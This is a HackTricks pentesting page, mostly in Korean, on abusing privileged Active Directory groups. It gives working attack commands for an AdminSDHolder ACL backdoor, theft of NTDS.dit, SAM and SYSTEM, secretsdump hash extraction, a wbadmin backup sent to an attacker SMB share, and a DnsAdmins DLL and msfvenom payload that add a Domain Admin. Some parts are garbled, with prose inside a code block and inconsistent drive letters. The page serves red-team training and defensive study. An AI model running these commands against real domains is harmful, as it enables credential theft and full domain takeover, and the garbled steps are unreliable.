# Privileged Groups

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

## Well Known groups with administration privileges

* **관리자**
* **도메인 관리자**
* **엔터프라이즈 관리자**

## Account Operators

이 그룹은 도메인에서 관리자가 아닌 계정 및 그룹을 생성할 수 있는 권한이 부여됩니다. 또한, 도메인 컨트롤러(DC)에 대한 로컬 로그인을 가능하게 합니다.

이 그룹의 구성원을 식별하기 위해 다음 명령이 실행됩니다:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
사용자 추가는 허용되며, DC01에 대한 로컬 로그인이 가능합니다.

## AdminSDHolder 그룹

**AdminSDHolder** 그룹의 접근 제어 목록(ACL)은 모든 "보호된 그룹"에 대한 권한을 설정하므로 매우 중요합니다. 여기에는 높은 권한 그룹이 포함됩니다. 이 메커니즘은 무단 수정을 방지하여 이러한 그룹의 보안을 보장합니다.

공격자는 **AdminSDHolder** 그룹의 ACL을 수정하여 표준 사용자에게 전체 권한을 부여함으로써 이를 악용할 수 있습니다. 이렇게 되면 해당 사용자는 모든 보호된 그룹에 대한 전체 제어 권한을 가지게 됩니다. 이 사용자의 권한이 변경되거나 제거되면, 시스템 설계로 인해 1시간 이내에 자동으로 복원됩니다.

구성원 검토 및 권한 수정을 위한 명령은 다음과 같습니다:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
복원 프로세스를 신속하게 진행할 수 있는 스크립트가 있습니다: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

자세한 내용은 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)을 방문하세요.

## AD Recycle Bin

이 그룹의 구성원은 삭제된 Active Directory 객체를 읽을 수 있으며, 이는 민감한 정보를 드러낼 수 있습니다:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### 도메인 컨트롤러 접근

DC의 파일 접근은 사용자가 `Server Operators` 그룹의 일원이 아닌 경우 제한됩니다. 이는 접근 수준을 변경합니다.

### 권한 상승

Sysinternals의 `PsService` 또는 `sc`를 사용하여 서비스 권한을 검사하고 수정할 수 있습니다. 예를 들어, `Server Operators` 그룹은 특정 서비스에 대한 전체 제어 권한을 가지고 있어 임의의 명령 실행 및 권한 상승을 허용합니다.
```cmd
C:\> .\PsService.exe security AppReadiness
```
이 명령은 `Server Operators`가 전체 액세스 권한을 가지고 있어 서비스 조작을 통해 상승된 권한을 얻을 수 있음을 보여줍니다.

## Backup Operators

`Backup Operators` 그룹의 구성원 자격은 `SeBackup` 및 `SeRestore` 권한 덕분에 `DC01` 파일 시스템에 대한 액세스를 제공합니다. 이러한 권한은 명시적인 권한 없이도 `FILE_FLAG_BACKUP_SEMANTICS` 플래그를 사용하여 폴더 탐색, 목록 작성 및 파일 복사 기능을 가능하게 합니다. 이 프로세스에는 특정 스크립트를 사용하는 것이 필요합니다.

그룹 구성원을 나열하려면 다음을 실행하십시오:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

이러한 권한을 로컬에서 활용하기 위해 다음 단계를 수행합니다:

1. 필요한 라이브러리 가져오기:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` 활성화 및 확인:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 제한된 디렉토리에서 파일에 접근하고 복사합니다. 예를 들어:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD 공격

도메인 컨트롤러의 파일 시스템에 직접 접근하면 도메인 사용자 및 컴퓨터에 대한 모든 NTLM 해시를 포함하는 `NTDS.dit` 데이터베이스를 훔칠 수 있습니다.

#### diskshadow.exe 사용

1. `C` 드라이브의 섀도우 복사본을 생성합니다:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. 그림자 복사본에서 `NTDS.dit` 복사:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
대안으로, 파일 복사를 위해 `robocopy`를 사용하십시오:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 해시 검색을 위해 `SYSTEM` 및 `SAM` 추출:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`에서 모든 해시를 검색합니다:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### wbadmin.exe 사용하기

1. 공격자 머신에서 SMB 서버를 위한 NTFS 파일 시스템을 설정하고 대상 머신에서 SMB 자격 증명을 캐시합니다.
2. 시스템 백업 및 `NTDS.dit` 추출을 위해 `wbadmin.exe`를 사용합니다:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

실용적인 시연을 보려면 [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)를 참조하세요.

## DnsAdmins

**DnsAdmins** 그룹의 구성원은 DNS 서버에서 SYSTEM 권한으로 임의의 DLL을 로드할 수 있는 권한을 악용할 수 있으며, 이는 종종 도메인 컨트롤러에서 호스팅됩니다. 이 기능은 상당한 악용 가능성을 제공합니다.

DnsAdmins 그룹의 구성원을 나열하려면 다음을 사용하세요:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 임의 DLL 실행

구성원은 다음과 같은 명령을 사용하여 DNS 서버가 임의의 DLL(로컬 또는 원격 공유에서)을 로드하도록 할 수 있습니다:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DNS 서비스를 재시작하는 것은 (추가 권한이 필요할 수 있음) DLL이 로드되기 위해 필요합니다:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
For more details on this attack vector, refer to ired.team.

#### Mimilib.dll
mimilib.dll을 사용하여 명령 실행을 수행하는 것도 가능하며, 특정 명령이나 리버스 셸을 실행하도록 수정할 수 있습니다. [이 게시물](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)을 참조하여 더 많은 정보를 확인하세요.

### WPAD Record for MitM
DnsAdmins는 전역 쿼리 차단 목록을 비활성화한 후 WPAD 레코드를 생성하여 Man-in-the-Middle (MitM) 공격을 수행하기 위해 DNS 레코드를 조작할 수 있습니다. Responder 또는 Inveigh와 같은 도구를 사용하여 네트워크 트래픽을 스푸핑하고 캡처할 수 있습니다.

### Event Log Readers
구성원은 이벤트 로그에 접근할 수 있으며, 평문 비밀번호나 명령 실행 세부정보와 같은 민감한 정보를 찾을 수 있습니다:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions
이 그룹은 도메인 객체의 DACL을 수정할 수 있으며, 잠재적으로 DCSync 권한을 부여할 수 있습니다. 이 그룹을 악용한 권한 상승 기법은 Exchange-AD-Privesc GitHub 리포지토리에 자세히 설명되어 있습니다.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators
Hyper-V 관리자는 Hyper-V에 대한 전체 액세스 권한을 가지고 있으며, 이를 통해 가상화된 도메인 컨트롤러에 대한 제어를 얻을 수 있습니다. 여기에는 라이브 DC를 클론하고 NTDS.dit 파일에서 NTLM 해시를 추출하는 것이 포함됩니다.

### Exploitation Example
Firefox의 Mozilla Maintenance Service는 Hyper-V 관리자가 SYSTEM으로 명령을 실행하는 데 악용될 수 있습니다. 여기에는 보호된 SYSTEM 파일에 대한 하드 링크를 생성하고 이를 악성 실행 파일로 교체하는 것이 포함됩니다:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Hard link exploitation has been mitigated in recent Windows updates.

## Organization Management

**Microsoft Exchange**가 배포된 환경에서는 **Organization Management**라는 특별한 그룹이 중요한 권한을 가지고 있습니다. 이 그룹은 **모든 도메인 사용자의 메일박스에 접근할 수 있는 권한**을 가지며, **'Microsoft Exchange Security Groups'** 조직 단위(OU)에 대한 **전체 제어**를 유지합니다. 이 제어에는 **`Exchange Windows Permissions`** 그룹이 포함되어 있으며, 이는 권한 상승을 위해 악용될 수 있습니다.

### Privilege Exploitation and Commands

#### Print Operators
**Print Operators** 그룹의 구성원은 **`SeLoadDriverPrivilege`**를 포함한 여러 권한을 부여받으며, 이를 통해 **도메인 컨트롤러에 로컬로 로그인**하고, 이를 종료하며, 프린터를 관리할 수 있습니다. 이러한 권한을 악용하기 위해서는, 특히 **`SeLoadDriverPrivilege`**가 비승격된 컨텍스트에서 보이지 않는 경우, 사용자 계정 컨트롤(UAC)을 우회해야 합니다.

이 그룹의 구성원을 나열하기 위해 다음 PowerShell 명령이 사용됩니다:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
더 자세한 **`SeLoadDriverPrivilege`** 관련 악용 기술에 대해서는 특정 보안 리소스를 참조해야 합니다.

#### 원격 데스크톱 사용자
이 그룹의 구성원은 원격 데스크톱 프로토콜(RDP)을 통해 PC에 접근할 수 있습니다. 이러한 구성원을 나열하기 위해 PowerShell 명령을 사용할 수 있습니다:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP를 악용하는 데 대한 추가 정보는 전용 pentesting 리소스에서 찾을 수 있습니다.

#### 원격 관리 사용자
구성원은 **Windows 원격 관리(WinRM)**를 통해 PC에 접근할 수 있습니다. 이러한 구성원의 열거는 다음을 통해 수행됩니다:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM**와 관련된 exploitation 기술에 대해서는 특정 문서를 참조해야 합니다.

#### 서버 운영자
이 그룹은 도메인 컨트롤러에서 다양한 구성을 수행할 수 있는 권한을 가지고 있으며, 여기에는 백업 및 복원 권한, 시스템 시간 변경, 시스템 종료가 포함됩니다. 구성원을 나열하기 위해 제공된 명령은 다음과 같습니다:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## References <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
